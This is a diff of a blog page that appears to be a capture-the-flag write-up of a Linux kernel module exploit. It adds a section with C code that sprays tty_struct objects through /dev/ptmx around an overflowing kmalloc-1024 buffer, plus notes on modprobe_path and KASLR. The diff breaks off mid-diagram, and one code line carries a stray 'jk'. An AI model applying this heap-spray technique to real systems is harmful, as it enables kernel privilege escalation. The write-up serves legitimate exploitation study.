@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>IrisCTF 2025 - Checksumz &ndash; guest@gbrls.github.io</title>
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>IrisCTF 2025 - Checksumz &ndash; gbrls.github.io</title>
 
 
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -35,7 +35,7 @@
 
             <header class="page__header"><nav class="page__nav main-nav">
     <ul>
-      <li class="nomarker"><h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">guest@gbrls.github.io</a></h1></li>
+      <li class="nomarker"><h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">gbrls.github.io</a></h1></li>
     
     
     </ul>
@@ -305,7 +305,7 @@ also override the <code>name</code> string pointer. This is going to be very use
 we can use the <code>rename</code> <code>ioctl</code> to write to that pointer 48 bytes.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">checksumz_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> command, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> arg) {
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> checksum_buffer<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> file<span style="color:#f92672">-&gt;</span>private_data;
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jk
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>file<span style="color:#f92672">-&gt;</span>private_data)
 </span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBADFD;
 </span></span><span style="display:flex;"><span>	
@@ -331,7 +331,539 @@ we have an arbitrary write anywhere in the kernel :)</p>
 </span></span></code></pre></div><h1 id="heap-magic">Heap magic</h1>
 <p>Oops, the writeup for this part is in progress&hellip;</p>
 <p><code>modprobe_path</code>, <code>KASLR</code>, <code>kmalloc-1024</code></p>
-<h1 id="references">References</h1>
+<p>Since we have a overflow on a object allocated to <code>kmalloc-1024</code> the heap
+layout will look like this:</p>
+
+
+
+<div class="goat svg-container ">
+  
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      font-family="Menlo,Lucida Console,monospace"
+      
+        viewBox="0 0 360 89"
+      >
+      <g transform='translate(8,16)'>
+<text text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'>┌</text>
+<text text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'>├</text>
+<text text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='0' y='68' fill='currentColor' style='font-size:1em'>└</text>
+<text text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='8' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='16' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='24' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='32' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='40' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='40' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='48' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'>┬</text>
+<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='56' y='36' fill='currentColor' style='font-size:1em'>┼</text>
+<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='56' y='68' fill='currentColor' style='font-size:1em'>┴</text>
+<text text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='64' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='72' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='80' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='88' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='88' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='96' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='96' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'>┬</text>
+<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='104' y='36' fill='currentColor' style='font-size:1em'>┼</text>
+<text text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='104' y='68' fill='currentColor' style='font-size:1em'>┴</text>
+<text text-anchor='middle' x='112' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='112' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='112' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='120' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='120' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='120' y='52' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='120' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='128' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='136' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>+</text>
+<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='144' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='152' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='152' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='160' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='168' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>4</text>
+<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='176' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='184' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>_</text>
+<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='192' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>b</text>
+<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='200' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='208' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='216' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='224' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='232' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='240' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='248' y='4' fill='currentColor' style='font-size:1em'>┬</text>
+<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>┼</text>
+<text text-anchor='middle' x='248' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>┴</text>
+<text text-anchor='middle' x='256' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='264' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='264' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='264' y='52' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='272' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='272' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='272' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='280' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='280' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='280' y='52' fill='currentColor' style='font-size:1em'>+</text>
+<text text-anchor='middle' x='280' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='288' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='288' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='288' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='296' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='296' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='296' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='304' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='304' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='304' y='52' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='304' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='312' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='312' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='312' y='52' fill='currentColor' style='font-size:1em'>8</text>
+<text text-anchor='middle' x='312' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='320' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='320' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='320' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='320' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='328' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='328' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='328' y='52' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='328' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='336' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='336' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='336' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='344' y='4' fill='currentColor' style='font-size:1em'>┐</text>
+<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='344' y='36' fill='currentColor' style='font-size:1em'>┤</text>
+<text text-anchor='middle' x='344' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='344' y='68' fill='currentColor' style='font-size:1em'>┘</text>
+</g>
+
+    </svg>
+  
+</div>
+<p>We can read and write to those objects since we can just offset via <code>lseek</code> by
+0x400 steps. We want to organize the heap in a way that we know which objects
+will be allocated next to our <code>checksum_buffer</code> struct. Looking for
+<code>kmalloc-1024</code> at [2] we see that there is <code>tty_struct</code> that can be allocated
+by opening <code>/dev/ptmx</code>.</p>
+<p>Below is the code to spray the heap with <code>tty_structs</code> which will be placed at
+<code>kmalloc-1024</code>. We allocate objects before too, to defragment the heap&rsquo;s freelist
+and to ensure that it&rsquo;ll work if the heap grows backwards or forwards.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#75715e">// spray sandwich below:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// the sprayed objs are tty_struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// ref: https://elixir.bootlin.com/linux/v6.10.10/source/include/linux/tty.h#L188
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// spray before (bread)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> spray[SPRAY_SZ];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SPRAY_SZ <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        spray[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>( <span style="color:#e6db74">&#34;/dev/ptmx&#34;</span> , O_RDONLY <span style="color:#f92672">|</span> O_NOCTTY);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(spray[i] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">__asm__</span>(<span style="color:#e6db74">&#34;int3&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// object with overflow (cheese)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/checksumz&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// spray after (bread)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> SPRAY_SZ <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; i <span style="color:#f92672">&lt;</span> SPRAY_SZ; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        spray[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>( <span style="color:#e6db74">&#34;/dev/ptmx&#34;</span> , O_RDONLY <span style="color:#f92672">|</span> O_NOCTTY);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(spray[i] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">__asm__</span>(<span style="color:#e6db74">&#34;int3&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>After the code above is executed the heap will look like the diagram below:</p>
+
+
+
+<div class="goat svg-container ">
+  
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      font-family="Menlo,Lucida Console,monospace"
+      
+        viewBox="0 0 424 89"
+      >
+      <g transform='translate(8,16)'>
+<text text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'>┌</text>
+<text text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'>├</text>
+<text text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='0' y='68' fill='currentColor' style='font-size:1em'>└</text>
+<text text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='8' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='16' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='24' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='32' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='40' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='40' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='48' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'>┬</text>
+<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='56' y='36' fill='currentColor' style='font-size:1em'>┼</text>
+<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>│</text>
+<text text-anchor='middle' x='56' y='68' fill='currentColor' style='font-size:1em'>┴</text>
+<text text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='64' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>?</text>
+<text text-anchor='middle' x='72' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='80' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>y</text>
+<text text-anchor='middle' x='88' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='88' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>_</text>
+<text text-anchor='middle' x='96' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='96' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='104' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='104' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='112' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='112' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='112' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='120' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='120' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='120' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='128' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='136' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='144' y='4' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>─</text>
+<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>─</text>
